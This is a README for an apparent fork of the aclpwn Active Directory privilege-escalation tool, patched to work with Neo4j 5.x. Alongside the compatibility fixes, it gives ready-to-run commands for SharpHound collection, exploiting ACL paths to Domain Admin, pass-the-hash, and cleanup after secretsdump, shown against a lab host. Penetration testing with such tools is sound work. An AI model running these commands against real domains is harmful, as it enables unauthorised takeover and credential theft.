# aclpwn-fixed — Neo4j 5.x Compatible Fork

**This is a patched fork of [aclpwn.py](https://github.com/dirkjanm/aclpwn.py) by [@_dirkjan](https://twitter.com/_dirkjan) (Dirk-jan Mollema / Fox-IT).**

The original tool stopped working because the `neo4j` Python driver went through several breaking API changes between versions 1.x → 2.x → 5.x. This fork patches all of those breakages so aclpwn works with the current driver (`neo4j>=5.0`) and Neo4j 4.x/5.x databases.

---

## What is aclpwn?

aclpwn finds and exploits Active Directory ACL (DACL) paths from a compromised user to Domain Admin (or any other target). It uses [BloodHound](https://github.com/BloodHoundAD/BloodHound)'s Neo4j graph database to enumerate the attack path, then executes the privilege escalation steps over LDAP automatically.

Original project: <https://github.com/dirkjanm/aclpwn.py>  
Original author: Dirk-jan Mollema / Fox-IT  
Original license: MIT

---

## Changes Made in This Fork

All changes are backward-compatible. The tool usage is identical to the original.

### 1. `aclpwn/database.py` — Fix broken import
```python
# Before (broken in neo4j driver 2.0+):
from neo4j.v1 import GraphDatabase

# After:
from neo4j import GraphDatabase
```
The `neo4j.v1` submodule was removed when the driver moved to version 2.0. The top-level `GraphDatabase` class is the correct import for all modern versions.

---

### 2. `aclpwn/pathfinding.py` — Fix Cypher parameter syntax + lazy Result bug

**Cypher `{param}` → `$param`** (Neo4j 4.0+ requires dollar-sign syntax):
```cypher
-- Before (Neo4j 3.x syntax, broken in 4.0+):
MATCH (n:User {name: {startnode}}) ...

-- After:
MATCH (n:User {name: $startnode}) ...
```
This was fixed in every query: `dijkstra_find_cypher`, `resolve_dijkstra_path`, `resolve_rest_path`, and the `queries` dict.

**Eager result consumption** (neo4j driver 5.x closes the `Result` when the transaction ends):
```python
# Before (raises ResultConsumedError in driver 5.x):
def get_path(...):
    with session.begin_transaction() as tx:
        return tx.run(...)   # Result is lazy — already dead when returned

# After:
def get_path(...):
    with session.begin_transaction() as tx:
        result = tx.run(...)
        return list(result)  # Eagerly consume before tx closes
```

**`dijkstra` algorithm removed**: The `dijkstra` option called the Neo4j REST API endpoint `POST /db/data/node/{id}/paths` which was removed in Neo4j 4.0. Use `--algorithm shortestonly` or `allsimple` instead (see usage below).

---

### 3. `aclpwn/utils.py` — Fix removed Relationship attributes

The neo4j driver 5.x removed `.start` and `.end` on `Relationship` objects. Use `.start_node.id` / `.end_node.id` instead:
```python
# Before (AttributeError in driver 5.x):
nmap[el.end].get('name')

# After:
nmap[el.end_node.id].get('name')
```
Fixed in `print_path()` and `build_path()`.

---

### 4. `aclpwn/__init__.py` — Fix Cypher parameter syntax
```cypher
-- Before:
MATCH (n:User {name: {name}}) RETURN n

-- After:
MATCH (n:User {name: $name}) RETURN n
```

---

### Bonus: `bh_import.py` — BloodHound JSON importer that actually works

The `bloodhound-import` pip package has a bug where it wraps all constraint creation in a single transaction — if any constraint already exists, the entire transaction is rolled back and **no data is written at all**. This custom importer handles `ConstraintAlreadyExists` gracefully and writes data even when the database has been used before.

```bash
# Import all BloodHound JSON files for a domain:
python3 bh_import.py /path/to/BloodHound/*.json
```

---

## Requirements

- Python 3.8+
- `neo4j>=5.0`
- `impacket`
- `ldap3`
- `requests`
- Neo4j 4.x or 5.x with BloodHound data imported

> **Note:** If you used `bloodhound-import` to load your data and got no results, your database may be empty. Use `bh_import.py` from this repo instead.

---

## Installation

### Option A — pipx (recommended)
```bash
pipx install git+https://github.com/eriakort8/aclpwn-fixed.git
```

### Option B — pip
```bash
pip install git+https://github.com/eriakort8/aclpwn-fixed.git
```

### Option C — from source
```bash
git clone https://github.com/eriakort8/aclpwn-fixed.git
cd aclpwn-fixed
pip install -e .
```

---

## Neo4j Setup

### Disable authentication (easiest for lab use)
```bash
# In /etc/neo4j/neo4j.conf:
dbms.security.auth_enabled=false

# Apply:
neo4j stop && neo4j start
```

### Verify Neo4j is running
```bash
curl http://localhost:7474
# Should return JSON with Neo4j version info
```

---

## Import BloodHound Data

### Collect with SharpHound
```powershell
# On target:
.\SharpHound.exe -c All --zipfilename bh-output.zip
```

### Import with bh_import.py (recommended)
```bash
# Extract zip, then:
python3 bh_import.py /path/to/BloodHound/*.json
```

---

## Usage

```
aclpwn [-h] -f FROM -ft {User,Computer,Group} -t TO -tt {User,Computer,Group,Domain}
        -d DOMAIN --database HOST -du DB_USER -dp DB_PASS
        -s SERVER [-p PASSWORD] [-H NTLMHASH]
        [--algorithm {allsimple,shortestonly,dijkstra-cypher}]
        [--dry-run] [--restore RESTORE_FILE]
```

### Find paths without exploiting (dry run)
```bash
aclpwn -f svc-alfresco@htb.local -ft User \
       -t htb.local -tt Domain \
       -d htb.local \
       --database localhost -du neo4j -dp "" \
       -s 10.10.10.161 \
       --algorithm shortestonly \
       --dry-run
```

### Exploit a path
```bash
aclpwn -f svc-alfresco@htb.local -ft User \
       -t htb.local -tt Domain \
       -d htb.local \
       --database localhost -du neo4j -dp "" \
       -s 10.10.10.161 \
       --algorithm shortestonly
```

> **Tip:** After exploitation, a `aclpwn-restore-*.json` file is created. Run secretsdump, dump what you need, then restore the ACLs to clean up.

### Undo / restore ACLs
```bash
aclpwn --restore aclpwn-restore-svc-alfresco_htb.json \
       -f svc-alfresco@htb.local -s 10.10.10.161
```

### Pass-the-hash
```bash
aclpwn -f user@domain.local -ft User -t domain.local -tt Domain \
       -d domain.local --database localhost -du neo4j -dp "" \
       -s 10.10.10.x -H <NTLM hash> \
       --algorithm shortestonly
```

---

## Algorithm Choice

| Algorithm | Neo4j version | Description |
|---|---|---|
| `allsimple` | 4.x / 5.x ✅ | All simple (non-repeating) paths. Most thorough. Default. |
| `shortestonly` | 4.x / 5.x ✅ | All shortest paths. Faster, still finds key paths. |
| `dijkstra-cypher` | 4.x / 5.x ✅ | Cost-weighted shortest path. Requires `algo.shortestPath` plugin. |
| `dijkstra` | ❌ Removed | Used Neo4j REST API (removed in Neo4j 4.0). Do not use. |

---

## Common Errors (Before This Fix)

| Error | Cause | Fix |
|---|---|---|
| `ModuleNotFoundError: No module named 'neo4j.v1'` | Driver 2.0+ dropped `neo4j.v1` | Fixed in `database.py` |
| `CypherSyntaxError: {name} is no longer supported` | Neo4j 4.0 dropped `{param}` syntax | Fixed in `pathfinding.py`, `__init__.py` |
| `ResultConsumedError: The result is out of scope` | Driver 5.x closes Result when tx ends | Fixed in `pathfinding.py` |
| `AttributeError: 'MemberOf' object has no attribute 'end'` | Driver 5.x removed `.end` on Relationship | Fixed in `utils.py` |
| `JSONDecodeError` on dijkstra runs | REST API removed in Neo4j 4.0 | Use `--algorithm shortestonly` |
| `[!] No User found` (despite data in Neo4j) | `bloodhound-import` constraint bug silently wrote nothing | Use `bh_import.py` |

---

## Credits

- **Original tool**: [aclpwn.py](https://github.com/dirkjanm/aclpwn.py) by Dirk-jan Mollema ([@_dirkjan](https://twitter.com/_dirkjan)) / Fox-IT — MIT License
- **Neo4j 5.x compatibility patches**: eriakort8
- **BloodHound**: [@wald0](https://twitter.com/_wald0), [@CptJesus](https://twitter.com/CptJesus), [@harmj0y](https://twitter.com/harmj0y)
- **impacket**: SecureAuth / fortra

---

## License

MIT — same as the original. See [LICENSE](LICENSE).
